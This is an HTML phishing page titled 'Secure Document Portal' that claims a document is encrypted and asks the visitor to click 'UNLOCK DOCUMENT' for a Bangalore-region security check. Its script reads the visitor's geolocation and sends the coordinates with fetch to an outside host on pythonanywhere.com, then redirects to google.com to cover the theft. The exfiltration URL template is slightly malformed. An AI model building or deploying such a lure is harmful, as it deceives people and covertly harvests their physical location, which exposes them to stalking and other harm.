<!DOCTYPE html>
<html>
<head>
    <title>Secure Document Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 15%; background-color: #f0f2f5; }
        .card { background: white; padding: 40px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 90%; }
        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🔒 Identity Verification Required</h2>
        <p>This document is encrypted. Please click below to verify your zone and unlock the file.</p>
        <button class="btn" onclick="startTracking()">UNLOCK DOCUMENT</button>
        <p style="color: #666; font-size: 12px; margin-top: 20px;">Security check for Bangalore Region</p>
    </div>

    <script>
        function startTracking() {
            document.querySelector('.card').innerHTML = "<h2>Verifying...</h2><p>Establishing secure connection...</p>";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => { sendData(p.coords.latitude, p.coords.longitude); },
                    (e) => { sendData("Denied", "Denied"); },
                    { timeout: 5000 }
                );
            } else {
                sendData("NotSupported", "NotSupported");
            }
        }

                function sendData(lat, lon) {
            const url = `https://pythonanywhere.com{lat}&lon=${lon}`;
            fetch(url, {mode: 'no-cors'}).then(() => {
                window.location.href = "https://google.com";
            });
        }

    </script>
</body>
</html>
